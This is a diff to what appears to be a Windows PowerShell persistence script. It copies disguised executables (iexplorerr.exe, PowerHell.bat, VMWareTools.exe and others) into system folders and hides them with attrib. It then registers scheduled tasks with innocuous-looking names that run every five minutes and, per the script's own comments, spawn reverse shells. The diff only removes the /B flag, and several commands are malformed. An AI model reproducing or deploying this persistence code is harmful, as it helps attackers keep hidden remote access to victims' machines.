@@ -18,7 +18,7 @@ move $iexplorerrLoc = "C:\Program Files\Common Files\System"
 # Hide the file from windows explorer using attrib
 attrib +h "C:\Program Files\Common Files\System\iexplorerr.exe"
 # Schedules the persistence to spawn a reverse shell
-schtasks /create /sc minute /mo 5 /tn "Update Internet Explorer" /tr "start /B C:\Program Files\Common Files\System\iexplorerr.exe"
+schtasks /create /sc minute /mo 5 /tn "Update Internet Explorer" /tr "start C:\Program Files\Common Files\System\iexplorerr.exe"
 
 # Find PowerHell.bat
 $file = 'PowerHell.bat'
@@ -29,7 +29,7 @@ move $powerhellLoc "C:\Program Files (x86)\Microsoft.NET"
 # Hide the file from windows explorer using attrib
 attrib +h C:\Program Files (x86)\Microsoft.NET\PowerHell.bat
 # Schedules the persistence to spawn a reverse shell
-schtasks /create /sc minute /mo 5 /tn "System Cleanup" /tr "start /B C:\Program Files (x86)\Microsoft.NET\PowerHell.bat"
+schtasks /create /sc minute /mo 5 /tn "System Cleanup" /tr "start C:\Program Files (x86)\Microsoft.NET\PowerHell.bat"
 
 # Find PowerManagement.exe
 $file = 'PowerManagement.exe'
@@ -40,7 +40,7 @@ move $powermanLoc C:\sources\en-US
 # Hide the file from windows explorer using attrib
 attrib +h  C:\sources\en-US\PowerManagement.exe
 # Schedules the persistence to spawn a reverse shell
-schtasks /create /sc minute /mo 5 /tn "System Cleanup" /tr "start /B C:\sources\en-US\PowerManagement.exe"
+schtasks /create /sc minute /mo 5 /tn "System Cleanup" /tr "start C:\sources\en-US\PowerManagement.exe"
 
 # Find VMWareTools.exe
 $file = 'VMWareTools.exe'
@@ -51,7 +51,7 @@ move $vmwaretoolsLoc C:\Users\Public
 # Hide VMWareTools.exe
 attrib +h C:\PerfLogs\VMWareTools.exe
 # Schedules the persistence to spawn a reverse shell
-schtasks /create /sc minute /mo 5 /tn "VMWare Updater" /tr "start /B C:\PerfLogs\VMWaretools.exe"
+schtasks /create /sc minute /mo 5 /tn "VMWare Updater" /tr "start C:\PerfLogs\VMWaretools.exe"
 
 # Find DiskHelper.exe
 $file = 'DiskHelper.exe'
@@ -62,7 +62,7 @@ move $diskhelperLoc = C:\Windows\drivers
 # Hide DiskHelper.exe
 attrib +h C:\Windows\drivers\DiskHelper.exe
 # Schedules the persistence to spawn a reverse shell
-schtasks /create /sc minute /mo 5 /tn "VMWare Updater" /tr "start /B C:\Windows\drivers\DiskHelper.exe"
+schtasks /create /sc minute /mo 5 /tn "VMWare Updater" /tr "start C:\Windows\drivers\DiskHelper.exe"
 
 # Find audio.exe
 $file = 'audio.exe'
@@ -73,7 +73,7 @@ move $audioLoc C:\Windows\DigitalLocker\en-us
 # Hide audio.exe 
 attrib +h C:\Windows\DigitalLocker\en-us\audio.exe
 # Schedules the persistence to spawn a reverse shell
-schtasks /create /sc minute /mo 5 /tn "audio player" /tr "start /B C:\Windows\DigitalLocker\en-us\audio.exe"
+schtasks /create /sc minute /mo 5 /tn "audio player" /tr "start C:\Windows\DigitalLocker\en-us\audio.exe"
 
 # Find LogMGMT.exe 
 $file = 'LogMGMT.exe'
@@ -84,7 +84,7 @@ move $logmgmtLoc C:\Windows\Globalization\ELS
 # Hide LogMGMT.exe
 attrib +h C:\Windows\Globalization\ELS\LogMGMT.exe
 # Schedules the persistence to spawn a reverse shell
-schtasks /create /sc minute /mo 5 /tn "Global Parsing" "start /B C:\Windows\Globalization\ELS\LogMGMT.exe"
+schtasks /create /sc minute /mo 5 /tn "Global Parsing" "start C:\Windows\Globalization\ELS\LogMGMT.exe"
 
 # Find sysinit.dll
 $sysinitLoc = Get-ChildItem sysinit.dll
